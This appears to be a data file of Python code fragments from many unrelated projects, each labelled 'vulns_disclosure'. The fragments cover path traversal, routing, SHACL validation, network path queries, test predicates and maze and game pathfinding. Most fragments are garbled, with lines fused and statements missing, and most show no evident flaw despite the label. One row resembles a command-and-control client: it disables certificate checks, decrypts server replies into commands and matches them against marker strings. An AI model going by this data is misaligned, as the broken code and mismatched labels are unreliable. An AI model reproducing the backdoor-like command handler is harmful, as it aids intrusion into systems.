"    ctx = ds.PathTraversalContext( {}, {}, self._root, {}, None, None, None )",vulns_disclosure
"    ctx = ds.PathTraversalContext( {}, {}, '', {}, None, None, None )",vulns_disclosure
"    ctx = ds.PathTraversalContext( {}, {}, self._root, {}, None, None, None )",vulns_disclosure
"    ctx = ds.PathTraversalContext( {}, {}, self._root, {}, None, None, None )",vulns_disclosure
"    ctx = ds.PathTraversalContext( {}, {}, self._root, {}, None, None, None )",vulns_disclosure
"    ctx = ds.PathTraversalContext( {}, {}, self._root, {}, None, None, None )",vulns_disclosure
"    config.add_route('queue'         , append_format_pattern('/queue')         )",vulns_disclosure
"        _override_cfg(container, rest, value)",vulns_disclosure
"            cwd = '/'.join((cwd, piece))",vulns_disclosure
"            cwd = '/'.join((cwd, piece))",vulns_disclosure
"            cwd = '/'.join((cwd, piece))",vulns_disclosure
        for v in self.nodes:            for w in self.nodes:                if v != w:                    for k in self.nodes:,vulns_disclosure
            obj = self.context.current_obj            if IContainer.providedBy(obj):                return [name for name in obj.listnames() if name.startswith(token)],vulns_disclosure
            if completions[0].endswith('='):                space = '',vulns_disclosure
"        eq_(self.terminal.method_calls, [('write', ('utes"" ',), {})])",vulns_disclosure
"        eq_(self.terminal.method_calls, [('write', ('utes ',), {})])        eq_(self.terminal.method_calls, [('write', ('utes ',), {})])",vulns_disclosure
    def resolve(path):,vulns_disclosure
"    def find_view(self, obj, unresolved_path):        sub_view_factory = queryAdapter(obj, IHttpRestSubViewFactory)        if sub_view_factory:            view = sub_view_factory.resolve(unresolved_path)        else:            view = queryAdapter(obj, IHttpRestView)        if not view:        return view",vulns_disclosure
"        view = self.find_view(obj, unresolved_path)",vulns_disclosure
                if token or not getUtility(IHttpRestAuthenticationUtility).get_basic_auth_credentials(request):,vulns_disclosure
            raise NotFound(),vulns_disclosure
"        """"""Offer the possibility to subclasses to massage the received json before default behavior.""""""",vulns_disclosure
"    if not path or path == '/':    path = re.sub(r'\/+', '/', path)    if path.endswith('/'):        path = path[:-1]    if path.startswith('/'):        path = path[1:]    path = path.split('/')",vulns_disclosure
"    """"""Utility which allows to to quickly register a subscription adapters which returns new instantiated objects    of a given class",vulns_disclosure
"    path = forms.RegexField(regex=r'^[^/][A-Za-z\-/\.]+[^/]$', widget=forms.TextInput,                            error_messages={'invalid': 'The path must not contain spaces, or start or end with a /'})",vulns_disclosure
"        validate_unique_project_path(self.initial['project'], self.cleaned_data['path'])        return super().clean()    path = forms.RegexField(regex=r'^[^/][A-Za-z0-9\-/\.]+[^/]$', widget=forms.TextInput,                            error_messages={'invalid': 'The path must not contain spaces, or start or end with a /'})",vulns_disclosure
"root = ["""", ""home"", ""root""]dirs = []path = []curr_path = [] or ["""", ""home"", ""root""]# To create directorydef mkdir():    global dirs    if dir in dirs:        print(""Directory already exist."")    else:        dirs.append(dir)        path.append(dir)# shows directorydef ls():    global path    if path == root:        path = dirs        path = path[0]    print(*path, sep=""\n"")# change directorydef cd():    global curr_path, dir, path    if dir == """":        curr_path = root        path = root    elif dir in dirs:        curr_path.append(dir)        path.clear()    elif dir == "".."":        curr_path.pop()        print(*curr_path, sep=""/"")        i = len(dirs) - 1        if dirs[i] in path:            i = i - 1            path.pop()            path.append(dirs[i])        else:            path.append(dirs[i])    else:        print(""Directory doesn't exist."")# show current directorydef pwd():    global curr_path    print(*curr_path, sep=""/"")# remove directorydef rm():    global dirs    if dir in dirs:        dirs.remove(dir)        if dir in path:            path.remove(dir)    else:        print(""Directory does not exist."")# clean session data like it is executed just nowdef session_clear():    global dirs    dirs.clear()    global curr_path    curr_path.clear()    curr_path = root    global path    path.clear()def commands(argument):    comm = {        ""mkdir"": mkdir,        ""ls"": ls,        ""cd"": cd,        ""pwd"": pwd,        ""rm"": rm,        ""session_clear"": session_clear,        ""exit"": exit    }    if n in comm:        # Get the function from comm dictionary        func = comm.get(argument)        # Execute the function        func()    else:        print(""command does not exist!"")print(    ""There are total 7 commands: mkdir, ls, cd, pwd, rm, session_clear, exit."")while True:    n = input(""$: "")    a = []    a.append(n.split("" ""))    n = a[0][0]    if n in [""mkdir"", ""rm""] and len(a[0]) == 1:        print(""{}:missing operand"".format(n))    elif len(a[0]) == 1:        dir = """"    elif len(a[0]) == 2:        dir = a[0][1]    else:        print(""Invalid Syntax"")    commands(n)",vulns_disclosure
"        curr_commit = Path('head')            mfs_commit = self.get_mfs_path(                fs_repo_root, branch, branch_info=curr_commit)            mfs_commit_meta = mfs_commit / 'metadata'                mfs_commit_hash = self.ipfs.files_stat(mfs_commit)['Hash']                mfs_commit_ref_hash = self.ipfs.files_stat(                    mfs_commit / 'bundle/files')['Hash']            meta = self.mfs_read_json(mfs_commit_meta)            if len(meta) == 0:                break            h, ts, msg = mfs_commit_hash[:6], meta['timestamp'], meta['message']                    print(f'* {mfs_commit_ref_hash} {ts} {auth}   {msg}')            commits.append(mfs_commit_hash)            curr_commit = curr_commit / 'parent1'",vulns_disclosure
"        board = Board(board_txt)        walkman = Walker()        row = 3        walkman.walk(board, row, col, 'east')",vulns_disclosure
"        print(row, col)",vulns_disclosure
"    walkman.walk(board, row, col, 'east')",vulns_disclosure
            n['children'].append(dict(name=i)),vulns_disclosure
"    name = 'emp-1zlab',      ",vulns_disclosure
    if root.val==s:        return [str(root.val) + ' '],vulns_disclosure
  cookies = None,vulns_disclosure
"    if len(self.session.cookies) > 0:      cookies = requests.utils.dict_from_cookiejar(self.session.cookies)      cookies['SessionID'] = self.cookie      print 'Including cookies'      print self.cookie    try:      if data:        response = self.session.post(url, data=data, headers=headers, verify=False ) # , files=files, stream=stream )      else:        response = self.session.get(url, headers=headers, verify=False )    except:      e = sys.exc_info()[1]      print 'Request failed: ' + str( e ), 'fail'       return False",vulns_disclosure
    print self.cookie,vulns_disclosure
      print response,vulns_disclosure
      cmd = self.decrypt( data )      out = ''      if 'fvdsghfdsyyh' in cmd:      elif '!d-3dion@LD!-d' in cmd:        out = '\n'.join(cmd.split('!d-3dion@LD!-d'))      else:         out = cmd,vulns_disclosure
from .value_constraints import ClassConstraintComponent    ClassConstraintComponent,vulns_disclosure
import pyshacl.consts,vulns_disclosure
"    def evaluate(self, target_graph, value_nodes):",vulns_disclosure
"from pyshacl.consts import SH, RDFS_subClassOf, RDF_typeSH_class = SH.term('class')    Definition:        if len(class_rules) > 1:            raise RuntimeError(""sh:class must only have one value."")        self.class_rule = class_rules[0]    def evaluate(self, target_graph, value_nodes):        :type value_nodes: list | set        for f in value_nodes:            t = target_graph.objects(f, RDF_type)            for ctype in iter(t):                if ctype == self.class_rule:                    continue                subclasses = target_graph.objects(ctype, RDFS_subClassOf)                if self.class_rule in iter(subclasses):                    continue            fails.append(f)        if len(fails) > 0:            return False, fails        return True, None",vulns_disclosure
"    def __init__(self, sg, node, p=False):",vulns_disclosure
        self.p = p        return bool(self.p),vulns_disclosure
"        target_subjects_of = self.target_objects_of()        return (target_nodes, target_classes,",vulns_disclosure
"        (target_nodes, target_classes, _, _) = self.target()",vulns_disclosure
"        found_target_classes = set()        for tc in iter(target_classes):                found_target_classes.add(subject)                    found_target_classes.add(subject)        return found_node_targets.union(found_target_classes)        if self.is_property_shape:            raise NotImplementedError(""value nodes of property shapes are not yet implmented."")        else:            return focus    def validate(self, target_graph, focus=None):        results = {}        value_nodes = self.value_nodes(target_graph, focus)            res = c.evaluate(target_graph, value_nodes)            results[p] = res        return results",vulns_disclosure
    other_shapes = set(has_target_class).union(set(has_target_node).union(set(has_target_objects_of).union(set(has_target_subjects_of))))    for s in other_shapes:,vulns_disclosure
"                ""A PropertyShape cannot have more than one 'sh:path' predicate."",    created_node_shapes = {Shape(g, s, False) for s in defined_node_shapes.union(found_node_shapes)}    created_prop_shapes = {Shape(g, s, True) for s in defined_prop_shapes.union(found_prop_shapes)}    return list(created_node_shapes.union(created_prop_shapes))",vulns_disclosure
from pyshacl.shape import find_shapeslogging.basicConfig(),vulns_disclosure
"    def __init__(self, target_graph, *args, shacl_graph=None, options=None, **kwargs):",vulns_disclosure
        if self.options['inference']:        results = {}            r = s.validate(self.target_graph)            results[s.node] = r        return results,vulns_disclosure
	base_path = '/workspace/Shared/Tech_Projects/EPSCoR_Southcentral/project_data/EPSCOR_SC_DELIVERY_AUG2016/derived/grids',vulns_disclosure
	base_path = '/workspace/Shared/Tech_Projects/EPSCoR_Southcentral/project_data/EPSCOR_SC_DELIVERY_AUG2016/derived/grids',vulns_disclosure
"                    help=""Full Path Between -p src dst (ip/cidr, requires NetDB)"",",vulns_disclosure
"    nglib.query.path.get_switched_path(args.spath, args.search, rtype=rtype)    nglib.query.path.get_routed_path(args.rpath, args.search, rtype=rtype)    nglib.query.path.get_full_path(args.path, args.search, rtype=rtype)",vulns_disclosure
"def get_full_path(src, dst, rtype=""NGTREE""):",vulns_disclosure
"            srcswp = get_switched_path(srctree['Switch'], router, verbose=False)            dstswp = get_switched_path(router, dsttree['Switch'], verbose=False)",vulns_disclosure
"        rtree = get_full_routed_path(src, dst, rtype=""NGTREE"", l2path=True)",vulns_disclosure
"def get_full_routed_path(src, dst, rtype=""NGTREE"", l2path=False):",vulns_disclosure
"            ngtree = get_routed_path(src, dst, verbose=False)                 ",vulns_disclosure
"                                vrf=srct['_child001']['VRF'], l2path=l2path)",vulns_disclosure
"                    vrf=dstt['_child001']['VRF'], l2path=l2path)def get_switched_path(switch1, switch2, rtype=""NGTREE"", verbose=True):    """"""    Find the path between two switches and return all interfaces and    devices between the two.    - Uses Neo4j All Shortest Paths on NEI Relationships    - Returns all distinct links along shortest paths along with distance    Notes: Query finds all shortest paths between two Switch nodes. Then finds    all links between individual nodes and gets both switch and port names. Data    is sorted by distance then switch name.    """"""    rtypes = ('CSV', 'TREE', 'JSON', 'YAML', 'NGTREE')    if rtype in rtypes:        logger.info(""Query: Finding Switched Paths (%s --> %s) for %s"",                    switch1, switch2, nglib.user)        pathList = []        ngtree = nglib.ngtree.get_ngtree(""Switched Paths"", tree_type=""L2-PATH"")        ngtree[""Name""] = switch1 + "" -> "" + switch2        dist = dict()        swp = nglib.py2neo_ses.cypher.execute(            'MATCH (ss:Switch), (ds:Switch), '            + 'sp = allShortestPaths((ss)-[:NEI*0..9]-(ds)) '            + 'WHERE ss.name =~ {switch1} AND ds.name =~ {switch2}'            + 'UNWIND nodes(sp) as s1 UNWIND nodes(sp) as s2 '            + 'MATCH (s1)<-[nei:NEI]-(s2), plen = shortestPath((ss)-[:NEI*0..9]-(s1)) '            + 'RETURN DISTINCT s1.name AS csw, s2.name AS psw, '            + 'nei.pPort AS pport, nei.cPort as cport, nei.native AS native, '            + 'nei.cPc as cPc, nei.pPc AS pPc, nei.vlans AS vlans, nei.rvlans as rvlans, '            + 'nei._rvlans AS p_rvlans, '            + 'LENGTH(plen) as distance ORDER BY distance, s1.name, s2.name',            {""switch1"": switch1, ""switch2"": switch2})        last = 0        for rec in swp:            swptree = nglib.ngtree.get_ngtree(""Link"", tree_type=""L2-HOP"")            if rec.distance == 0:                swptree['distance'] = rec.distance + 1                last = 1            elif last:                if rec.distance == last:                    last += 1                    swptree['distance'] = rec.distance + 1                elif rec.distance == (last-1):                    swptree['distance'] = rec.distance + 1                else:                    swptree['distance'] = rec.distance                    last = 0            else:                swptree['distance'] = rec.distance            swptree['Name'] = '#' + str(swptree['distance']) + ' ' + \            rec.psw + '(' + rec.pport +  ') <-> ' \            + rec.csw + '(' + rec.cport + ')'            nglib.ngtree.add_child_ngtree(ngtree, swptree)            swptree['Child Switch'] = rec.csw            swptree['Child Port'] = rec.cport            swptree['Parent Switch'] = rec.psw            swptree['Parent Port'] = rec.pport            if rec.cPc:                swptree['Child Channel'] = rec.cPc                swptree['Parent Channel'] = rec.pPc            if rec.rvlans:                swptree['Link VLANs'] = rec.vlans                swptree['Link rVLANs'] = rec.rvlans                swptree['_rvlans'] = rec.p_rvlans                swptree['Native VLAN'] = rec.native            pathList.append(swptree)        if pathList:            ngtree['Links'] = len(pathList)            ngtree['Distance'] = max([s['distance'] for s in pathList])            if rtype == ""CSV"":                nglib.query.print_dict_csv(pathList)            else:                ngtree = nglib.query.exp_ngtree(ngtree, rtype)                return ngtree        elif verbose:            print(""No results found for path between {:} and {:}"".format(switch1, switch2))    returndef get_routed_path(net1, net2, rtype=""NGTREE"", vrf=""default"", verbose=True, l2path=True):",vulns_disclosure
"                    nglib.ngtree.add_child_ngtree(ngtree, rtree)",vulns_disclosure
    :param data:,vulns_disclosure
"            for step in path:                if isinstance(step, Node):                    traverse_node(step, tcs)                if isinstance(step, Edge):                    if step.type.name == 'PreCondition':                        update_testcase_precondition(step, pre_condition)                    traverse_edge(step, tcs)            data.append({                'pre_condition': pre_condition,                'tc_steps': tcs            })",vulns_disclosure
                                start_node_found_outside = search_start_node_outside(edge.from_node),vulns_disclosure
    :param step:,vulns_disclosure
def search_start_node_outside(node):    flag = False    if node.arriving_edges.count() > 0:        for edge in node.arriving_edges:            if edge.from_node.type.name == START_NODE_NAME:                flag = True                break    return flag,vulns_disclosure
"def create_testcases_celery(project_id, call_from=None):",vulns_disclosure
    msg = 'TestCases updated.'    if not call_from:        msg = push_testcases_to_testrail_celery(project.id),vulns_disclosure
"        start = time.time()        data = create_routing_test_suite_module(project.modules, language)        print(project.name, time.time() - start)        data = create_routing_test_suite_module(modules, language)def create_routing_test_suite_module(modules, language):",vulns_disclosure
"        start_time = time.time()        data = get_paths_through_all_edges(module.edges_all, th_module, language)        print(module.name, time.time() - start_time)def get_paths_through_all_edges(edges, th_module=None, language=None):",vulns_disclosure
"    shortest_set = []  # found shortest set from Start to node, key is 'Start + node', value is list of nodes                start = time.time()",vulns_disclosure
"        create_testcases_celery(object_id, call_from='OldTC')",vulns_disclosure
    'key_field',vulns_disclosure
        self.key_field = None,vulns_disclosure
        if new_class._meta.key_field is not None:            if new_class._meta.key_field not in field_attnames:                raise Exception('Key field `{}` is not exist on this resource.'.format(new_class._meta.key_field)),vulns_disclosure
"                    _, _, field = self._path[-1]                    self._path[-1] = (key, NotSupplied, field)",vulns_disclosure
        key_field = 'isbn',vulns_disclosure
"                    'on_enter: level2s[b].level3s[0]',                    'on_exit: level2s[b].level3s[0]',                    'on_enter: level2s[b].level3s[1]',                    'on_exit: level2s[b].level3s[1]',                'on_enter: level2s[c].level3s[0]',                'on_exit: level2s[c].level3s[0]',",vulns_disclosure
"                    'on_enter: level2s[b].level3s[0]',                    'on_exit: level2s[b].level3s[0]',                    'on_enter: level2s[b].level3s[1]',                    'on_exit: level2s[b].level3s[1]',                'on_enter: level2s[c].level3s[0]',                'on_exit: level2s[c].level3s[0]',",vulns_disclosure
"                    'on_enter: level2s[b].level3s[0]',                    'on_exit: level2s[b].level3s[0]',                    'on_enter: level2s[b].level3s[1]',                    'on_exit: level2s[b].level3s[1]',                'on_enter: level2s[c].level3s[0]',                'on_exit: level2s[c].level3s[0]',",vulns_disclosure
"                raise ValueError('Duplicate entity ID ""%s"".' % entity.id)            self.__id_map[entity.id] = entity",vulns_disclosure
"                raise ValueError('Duplicate entity slug ""%s"".' % entity.slug)            self.__slug_map[entity.slug] = entity        self.__entities.append(entity)",vulns_disclosure
                     for attr in attrs]),vulns_disclosure
This file is part of the everest project. ,vulns_disclosure
"        tp.push(parent, 'attribute', rel_op)        tp1 = tp.clone()        self.assert_equal(len(tp1), 1)",vulns_disclosure
        self.__traversed = set(),vulns_disclosure
        path = TraversalPath(),vulns_disclosure
"            self.traverse_many(path, None, srcs, tgts, visitor)            self.traverse_one(path, None, self._src_prx, self._tgt_prx,                              visitor)    def traverse_one(self, path, attribute, source, target, visitor):",vulns_disclosure
"            self.__log_traverse_one(path, attribute, source, target)        self.__traversed.add((source, target))",vulns_disclosure
"                    key = (attr_source, attr_target)                    if key in self.__traversed:                        continue",vulns_disclosure
"                path.push(parent, attr, rel_op)                self.traverse_many(path.clone(), attr, src_items, tgt_items,                                   visitor)                path.pop()        visitor.visit(path, attribute, source, target)    def traverse_many(self, path, attribute, source_sequence,                      target_sequence, visitor):",vulns_disclosure
"            if not (None, target) in self.__traversed:                self.traverse_one(path, attribute, None, target, visitor)            if not (source, target) in self.__traversed:                self.traverse_one(path, attribute, source, target, visitor)",vulns_disclosure
"    def __init__(self, proxy, attribute, relation_operation):",vulns_disclosure
"    def push(self, proxy, attribute, relation_operation):        node = TraversalPathNode(proxy, attribute, relation_operation)        self.nodes.pop()    def clone(self):        """"""        Returns a copy of this traversal path.        """"""        return TraversalPath(self.nodes[:])",vulns_disclosure
"            data = self.pipe(self.pip_command, data)",vulns_disclosure
	rotateError = 3 #degrees,vulns_disclosure
"	print ""Start: "", forwardAngle, currentGyro, angle",vulns_disclosure
"		print "" ""		print ""AngleWant: "", angleWant		print ""AngleHave: "", angleHave",vulns_disclosure
hasLeft = 0hasFront = 1hasRight = 0	hasLeft = hasNoWall(detectDistance(-90))	hasFront = hasNoWall(detectDistance(0))	hasRight = hasNoWall(detectDistance(90)),vulns_disclosure
"sensorMotor.duty_cycle_sp = 50forwardAngle = gyroValue() #allow us to monitor the path as we are moving forwardprint ""starter: "", forwardAngle	i = 0	while(i < 5):		forwardAngle = gyroValue()		print ""starter2: "", forwardAngle		sleep(0.2)		i = i+1	print ""ready!""		Motors: Motor.count_per_rot, run_to_rel_pos				How to keep going forward:		Each turn add angle and mod 360. All angles will be 0-360				currentDir = gyroValue()		if(forwardAngle + degrees > 360 || forwardAngle - degrees < 0) {			//shift angles to work at a better range			changedForwardAngle = (forwardAngle-180)%360			changedCurrentDir = (currentDir-180)%360						if(changedCurrentDir - degrees) > (changedForwardAngle):				rightMotor.duty_cycle_sp = 40			TODO:Finish		}				""""""sensorThread();			currentPath.visited = True;			currentIndex = len(nodeList)-1			if(hasRight) {				newPath = PathNode(currentPath.ID, -90)				for i, j in enumerate(nodeList):					if j.ID == newPath.parentID:						nodeList.insert(j+1,newPath)			}			if(hasFront) {				newPath = PathNode(currentPath.ID, 0)				for i, j in enumerate(nodeList):					if j.ID == newPath.parentID:						nodeList.insert(j+1,newPath)			}			if(hasLeft) {				newPath = PathNode(currentPath.ID, 90)					if j.ID == newPath.parentID:						nodeList.insert(j+1,newPath)			}						currentNode = nodeList[currentIndex]			direction = gyroValue();			print ""gyrovalue: "", (direction-5)%360, forwardAngle						forwardAngle-=90			leftMotor.run_to_rel_pos(position_sp=225, stop_command=""brake"")			rightMotor.run_to_rel_pos(position_sp=-225, stop_command=""brake"")			while any(m.state for m in (leftMotor, rightMotor)):				sleep(0.1)			moveFoward(47,47)			sleep(2)""""""		detectSkew(gyroValue())",vulns_disclosure
"def _is_package(directory):    base = os.path.splitext(os.path.basename(file))[0]    name = [base] if base != '__init__' else []    parent = None    while current != parent and _is_package(current):        parent = os.path.dirname(current)        name.append(os.path.basename(current))        current = parent    return current, '.'.join(reversed(name))",vulns_disclosure
"def find_all_paths_for_start_node(graph, start, end, already_visited, is_withing_scaf, max_path_length_allowed, param):",vulns_disclosure
"        paths = find_all_paths_for_start_node(G_prime, start_node, end, already_visited, 0, 2 ** 32, param)",vulns_disclosure
"    paths = find_all_paths_for_start_node(G_prime, start, end, already_visited, 1, max_path_length, param)",vulns_disclosure
"            path_dict[(ctg1,ctg2)] = ctg2.position - (ctg1.position + ctg1.length) - 1 ",vulns_disclosure
"        ctg_lengths = map(lambda x: x.length, self.ctgs)        if 1359 in ctg_lengths and 673 in ctg_lengths: #len(path.gaps) >= 4:            print 'Obj:',self.objective            print ""of which stddev contributing:"", obj_delta_stddev",vulns_disclosure
"    def dfs_recur(current_node, path):",vulns_disclosure
"                if node not in path:                    dfs_recur(node, path)    dfs_recur(0, [0])",vulns_disclosure
"        sys.exit(1)	",vulns_disclosure
"            print ""\nBase directory already exists: "" + datestamp + "" -- skipping.""",vulns_disclosure
"        print ""\n* Directory already exists (skipping):\n"" + datestamp + d",vulns_disclosure
"        print ""\n* File already exists (skipping):\n"" + cloud_path",vulns_disclosure
"        node, key = traverse(self, path, sep=self._sep,                             on_missing=self._create_on_missing)        if node is self:            self._data[key] = value        node, key = traverse(self, path, sep=self._sep,                             on_missing=raise_on_missing)        if node is self:            return self._data[key]        node, key = traverse(self, path, sep=self._sep,                             on_missing=raise_on_missing)        if node is self:            del self._data[key]",vulns_disclosure
import citest.json_contract as jc,vulns_disclosure
"         jc.PathContainsPredicate(         jc.PathPredicate(             'LoadBalancerDescriptions/AvailabilityZones',             jc.LIST_SIMILAR(avail_zones)),         jc.PathElementsContainPredicate(",vulns_disclosure
"         jc.PathContainsPredicate(         jc.PathPredicate(             'LoadBalancerDescriptions/AvailabilityZones',             jc.LIST_SIMILAR(expect_avail_zones)),         jc.PathElementsContainPredicate(",vulns_disclosure
import citest.json_contract as jc,vulns_disclosure
"      name_matches_pred = jc.PathContainsPredicate('name', name)      is_stopping_pred = jc.PathEqPredicate('status', 'STOPPING')      clause.add_mapped_constraint(jc.IF(name_matches_pred, is_stopping_pred))",vulns_disclosure
"            [jc.PathContainsPredicate('name', server_group_name),             jc.PathContainsPredicate(",vulns_disclosure
"            [jc.PathContainsPredicate('name', self.__use_http_lb_hc_name),             jc.PathContainsPredicate(None, health_check)]))           [jc.PathContainsPredicate('name', self.__use_http_lb_fr_name),            jc.PathContainsPredicate('portRange', port_range)]))           [jc.PathContainsPredicate('name', self.__use_http_lb_bs_name),            jc.PathElementsContainPredicate(           [jc.PathContainsPredicate('name', self.__use_http_lb_map_name),            jc.PathContainsPredicate(           [jc.PathContainsPredicate('name', self.__use_http_lb_proxy_name),            jc.PathContainsPredicate('urlMap', self.__use_http_lb_map_name)]))",vulns_disclosure
"           [jc.PathContainsPredicate('name', self.__use_lb_hc_name),            jc.PathContainsPredicate(None, health_check)]))",vulns_disclosure
"          [jc.PathContainsPredicate('name', self.__use_lb_tp_name),           jc.PathEqPredicate('region', self.bindings['TEST_GCE_REGION']),           jc.PathElementsContainPredicate(           jc.PathElementsContainPredicate(           [jc.PathContainsPredicate('name', self.__use_lb_tp_name),            jc.PathElementsContainPredicate(",vulns_disclosure
"          [jc.PathContainsPredicate('name', self.__use_lb_tp_name),           jc.PathElementsContainPredicate(           jc.PathElementsContainPredicate(",vulns_disclosure
       .add_constraint(jc.EQUIVALENT(expect_images))),vulns_disclosure
import citest.json_contract as jc,vulns_disclosure
"         jc.PathContainsPredicate('baseInstanceName', self.__server_group_name),         jc.PathContainsPredicate('targetPools', 'https')]))",vulns_disclosure
"         jc.PathContainsPredicate('baseInstanceName', self.__server_group_name),         jc.PathContainsPredicate('targetPools', 'https')]))",vulns_disclosure
"         [jc.PathContainsPredicate('name', '%s-hc' % load_balancer_name),          jc.DICT_SUBSET(spec)]))",vulns_disclosure
"          jc.PathContainsPredicate('name', load_balancer_name),          jc.PathContainsPredicate('target', target_pool_name)]))",vulns_disclosure
import citest.json_contract as jc,vulns_disclosure
"         jc.PathContainsPredicate(         jc.PathPredicate(             'LoadBalancerDescriptions/AvailabilityZones',             jc.LIST_SIMILAR(avail_zones)),         jc.PathElementsContainPredicate(",vulns_disclosure
"         jc.PathContainsPredicate(         jc.PathPredicate(             'LoadBalancerDescriptions/AvailabilityZones',             jc.LIST_SIMILAR(expect_avail_zones)),         jc.PathElementsContainPredicate(",vulns_disclosure
import citest.json_contract as jc,vulns_disclosure
"      name_matches_pred = jc.PathContainsPredicate('name', name)      is_stopping_pred = jc.PathEqPredicate('status', 'STOPPING')      clause.add_mapped_constraint(jc.IF(name_matches_pred, is_stopping_pred))",vulns_disclosure
"            [jc.PathContainsPredicate('name', server_group_name),             jc.PathContainsPredicate(",vulns_disclosure
"            [jc.PathContainsPredicate('name', self.__use_http_lb_hc_name),             jc.PathContainsPredicate(None, health_check)]))           [jc.PathContainsPredicate('name', self.__use_http_lb_fr_name),            jc.PathContainsPredicate('portRange', port_range)]))           [jc.PathContainsPredicate('name', self.__use_http_lb_bs_name),            jc.PathElementsContainPredicate(           [jc.PathContainsPredicate('name', self.__use_http_lb_map_name),            jc.PathContainsPredicate(           [jc.PathContainsPredicate('name', self.__use_http_lb_proxy_name),            jc.PathContainsPredicate('urlMap', self.__use_http_lb_map_name)]))",vulns_disclosure
"           [jc.PathContainsPredicate('name', self.__use_lb_hc_name),            jc.PathContainsPredicate(None, health_check)]))",vulns_disclosure
"          [jc.PathContainsPredicate('name', self.__use_lb_tp_name),           jc.PathEqPredicate('region', self.bindings['TEST_GCE_REGION']),           jc.PathElementsContainPredicate(           jc.PathElementsContainPredicate(           [jc.PathContainsPredicate('name', self.__use_lb_tp_name),            jc.PathElementsContainPredicate(",vulns_disclosure
"          [jc.PathContainsPredicate('name', self.__use_lb_tp_name),           jc.PathElementsContainPredicate(           jc.PathElementsContainPredicate(",vulns_disclosure
       .add_constraint(jc.EQUIVALENT(expect_images))),vulns_disclosure
import citest.json_contract as jc,vulns_disclosure
"         jc.PathContainsPredicate('baseInstanceName', self.__server_group_name),         jc.PathContainsPredicate('targetPools', 'https')]))",vulns_disclosure
"         jc.PathContainsPredicate('baseInstanceName', self.__server_group_name),         jc.PathContainsPredicate('targetPools', 'https')]))",vulns_disclosure
"         [jc.PathContainsPredicate('name', '%s-hc' % load_balancer_name),          jc.DICT_SUBSET(spec)]))",vulns_disclosure
"          jc.PathContainsPredicate('name', load_balancer_name),          jc.PathContainsPredicate('target', target_pool_name)]))",vulns_disclosure
import citest.json_contract as jc,vulns_disclosure
"         jc.PathContainsPredicate(         jc.PathPredicate(             'LoadBalancerDescriptions/AvailabilityZones',             jc.LIST_SIMILAR(avail_zones)),         jc.PathElementsContainPredicate(",vulns_disclosure
"         jc.PathContainsPredicate(         jc.PathPredicate(             'LoadBalancerDescriptions/AvailabilityZones',             jc.LIST_SIMILAR(expect_avail_zones)),         jc.PathElementsContainPredicate(",vulns_disclosure
import citest.json_contract as jc,vulns_disclosure
"      name_matches_pred = jc.PathContainsPredicate('name', name)      is_stopping_pred = jc.PathEqPredicate('status', 'STOPPING')      clause.add_mapped_constraint(jc.IF(name_matches_pred, is_stopping_pred))",vulns_disclosure
"            [jc.PathContainsPredicate('name', server_group_name),             jc.PathContainsPredicate(",vulns_disclosure
"            [jc.PathContainsPredicate('name', self.__use_http_lb_hc_name),             jc.PathContainsPredicate(None, health_check)]))           [jc.PathContainsPredicate('name', self.__use_http_lb_fr_name),            jc.PathContainsPredicate('portRange', port_range)]))           [jc.PathContainsPredicate('name', self.__use_http_lb_bs_name),            jc.PathElementsContainPredicate(           [jc.PathContainsPredicate('name', self.__use_http_lb_map_name),            jc.PathContainsPredicate(           [jc.PathContainsPredicate('name', self.__use_http_lb_proxy_name),            jc.PathContainsPredicate('urlMap', self.__use_http_lb_map_name)]))",vulns_disclosure
"           [jc.PathContainsPredicate('name', self.__use_lb_hc_name),            jc.PathContainsPredicate(None, health_check)]))",vulns_disclosure
"          [jc.PathContainsPredicate('name', self.__use_lb_tp_name),           jc.PathEqPredicate('region', self.bindings['TEST_GCE_REGION']),           jc.PathElementsContainPredicate(           jc.PathElementsContainPredicate(           [jc.PathContainsPredicate('name', self.__use_lb_tp_name),            jc.PathElementsContainPredicate(",vulns_disclosure
"          [jc.PathContainsPredicate('name', self.__use_lb_tp_name),           jc.PathElementsContainPredicate(           jc.PathElementsContainPredicate(",vulns_disclosure
       .add_constraint(jc.EQUIVALENT(expect_images))),vulns_disclosure
import citest.json_contract as jc,vulns_disclosure
"         jc.PathContainsPredicate('baseInstanceName', self.__server_group_name),         jc.PathContainsPredicate('targetPools', 'https')]))",vulns_disclosure
"         jc.PathContainsPredicate('baseInstanceName', self.__server_group_name),         jc.PathContainsPredicate('targetPools', 'https')]))",vulns_disclosure
"         [jc.PathContainsPredicate('name', '%s-hc' % load_balancer_name),          jc.DICT_SUBSET(spec)]))",vulns_disclosure
"          jc.PathContainsPredicate('name', load_balancer_name),          jc.PathContainsPredicate('target', target_pool_name)]))",vulns_disclosure
"                    path = boardObj.shortPath(AI.getPos(), user_locations)",vulns_disclosure
"    def shortPath(self, start_coord, end_coords):",vulns_disclosure
"    grid = Graph(34, 19)",vulns_disclosure
"            while count_two <= len(path) - 1:                drawn_path.append(Line(screen, (0, 0, 255), Vector2(line_start.x_pos + 20,        pygame.draw.rect(screen, (0, 255, 0), start_square)        pygame.draw.rect(screen, (255, 0, 0), goal_square)",vulns_disclosure
    duplicates = []        if by_hash.has_key(level_hash):            other = by_hash[level_hash]            by_path[short_path] = other            duplicates.append(level)            continue        by_hash[level_hash] = level        by_path[short_path] = level,vulns_disclosure
"            key = by_path[key][""level_hash""]        if by_hash.has_key(key):                return unprocessed.index(key), by_hash[key]            except ValueError:        return -1, None        left_of = find(level[""edges""][1])[1]        right_of = find(level[""edges""][3])[1]",vulns_disclosure
"            se_level = find(east[""edges""][2])[1]            sw_level = find(west[""edges""][2])[1]            ne_level = find(east[""edges""][0])[1]            nw_level = find(west[""edges""][0])[1]",vulns_disclosure
            level = by_hash[pick],vulns_disclosure
"                    corrupted = False # HACK                    if not tile is level:                        try:                            index = unprocessed.index(tile[""level_hash""])                            unprocessed.pop(index)                        except:                            corrupted = True # HACK                     setlist.write(tile[""path""] + ""\n"")                if corrupted: # HACK                    print ""(known bug) quad is likely wrong because of duplicate aliasing:""                    for tile in adjacent_group:                        print "" ***"", tile[""path""]                 edges = level[""edges""]                setlist.write(level[""path""] + ""\n"")                    index, found = find(target)                    if found:                        queue.append(unprocessed.pop(index))            if edges:                for edge_path in edges:                    if edge_path:                        edge_index, edge_level = find(edge_path)                        if edge_level and random.random() < edge_odds:                            queue.append(unprocessed.pop(edge_index))    if boring:        print ""Skipped \""boring\"" levels:""        for level in boring:            print "" -"", level[""path""]    if duplicates:        print ""Skipped non-unique levels:""        for level in duplicates:            print "" -"", level[""path""]",vulns_disclosure
